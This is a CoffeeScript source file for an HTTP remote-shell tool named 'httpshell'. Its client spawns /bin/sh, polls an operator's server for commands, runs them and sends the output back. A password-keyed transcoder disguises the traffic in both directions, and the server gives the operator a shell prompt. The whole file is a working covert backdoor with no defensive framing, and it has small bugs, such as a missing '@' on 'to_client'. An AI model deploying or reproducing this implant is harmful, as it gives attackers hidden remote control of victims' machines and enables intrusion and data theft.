http = require 'http'
{spawn} = require 'child_process'
{transcoder} = require './transcoder'

class exports.server
        constructor: (@host,@port,@delay,@password,@client_dict,@server_dict,@client_template,@server_template)->
                console.log "Running as server\n"
                #setup transcoders
                @ct = new transcoder @client_dict, @password, @client_template
                @st = new transcoder @server_dict, @password, @client_template

                @to_client = ''

                #setup the stdin to receive input from user
                process.stdin.resume()
                process.stdin.setEncoding 'utf8'
                #when we get a command from the user we encode and send it to the client
                process.stdin.on 'data', (data) =>
                        to_client += @st.encode data
                #If they want a shell, we'll give them a prompt :D
                process.stdout.write "\nhttpshell# "
                #Create an HTTP server to listen for reponses from client
                http.createServer (request,response) =>
                        request.setEncoding 'utf8'
                        from_client = ''
                        #when we get data we add it to a queue to send to the user
                        #we do it this way rather than printing it directly to make sure that
                        #chunked data shows up all at once
                        request.on 'data', (data) =>
                                from_client += @ct.decode data
                        #If the connection closes improperly, we just keep going
                        request.on 'close', =>
                                if from_client? and from_client != ''
                                        process.stdout.write from_client
                                        process.stdout.write 'httpShell# '
                                response.end @to_client
                                @to_client = ''
                        #When the http request is finished we decode and print the data back to the user
                        request.on 'end', =>
                                if from_client? and from_client != ''
                                        process.stdout.write from_client
                                        process.stdout.write 'httpShell# '
                                response.end @to_client
                                @to_client = ''
                .listen port


class exports.client
        constructor: (@host,@port,@delay,@password,@client_dict,@server_dict,@client_template,@server_template)->
                console.log "Running as client\n"
                #setup transcoders
                @ct = new transcoder @client_dict, @password, @client_template
                @st = new transcoder @server_dict, @password, @client_template

                @to_return = ""
                #Spawn a shell as a subprocess
                @sh = spawn '/bin/sh'
                @sh.stdout.setEncoding 'utf8'
                @sh.stderr.setEncoding 'utf8'
                #When the shell gives us data we send it to the server
                @sh.stdout.on 'data', (data) =>
                        @to_return += data
                @sh.stderr.on 'data', (data) =>
                        @to_return += data
                #We periodically send a request to the server to see
                #if there are more commands to run.
                setInterval =>
                        options = {host:@host,port: @port,path: '/',method: 'POST'}
                        req = http.request options, (res) =>
                                res.setEncoding 'utf8'
                                res.on 'data', (data) =>
                                        if data? and data != ''
                                                decoded = @st.decode data
                                                @sh.stdin.write decoded
                        #we do the response on a timeout so the shell has time to generate a response
                        setTimeout (req) =>
                                req.write @ct.encode(@to_return)
                                @to_return = ""
                                req.end()
                        ,500,req
                ,@delay